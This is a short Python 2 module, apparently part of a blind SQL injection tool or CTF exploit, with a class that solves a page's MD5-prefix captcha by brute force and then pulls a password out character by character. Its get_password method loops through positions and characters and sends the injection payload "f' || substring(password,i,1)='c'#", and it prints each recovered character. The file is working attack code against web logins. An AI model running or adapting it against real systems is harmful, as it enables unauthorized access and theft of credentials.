#!/usr/bin/env python
# -*- coding:utf-8 -*-
import hashlib
from lib.log import logger
from data import DataProcess
from config import BaseConfig

__author__ = "LoRexxar"


class ExpandFunction(BaseConfig):
    """
    拓展函数，自定义处理复杂情况
    """

    # 从页面中获取验证码
    def __init__(self):
        BaseConfig.__init__(self)
        self.Data = DataProcess()

    def get_code(self):
        r = self.s.get(self.url)
        code = r.text.find('==')
        return r.text[code + 3:code + 7]

    # 跑验证码
    @staticmethod
    def crack_code(code):
        sstr = 10000

        while 1:
            m2 = hashlib.md5()
            m2.update(repr(sstr))
            if m2.hexdigest()[0:4] == code:
                return sstr
            sstr += 1

    # 注当前表数据
    def get_password(self):
        password = ""
        for i in xrange(33):
            for j in range(40, 130):
                payload = "f' || substring(password," + repr(i) + ",1)='" + chr(j) + "'#"
                print payload
                whether = self.Data.GetData(payload)
                if whether == 0:
                    strr = j
                    password += chr(strr)
                    print "[*] password: " + password
                    break
        print "[*] password: " + password
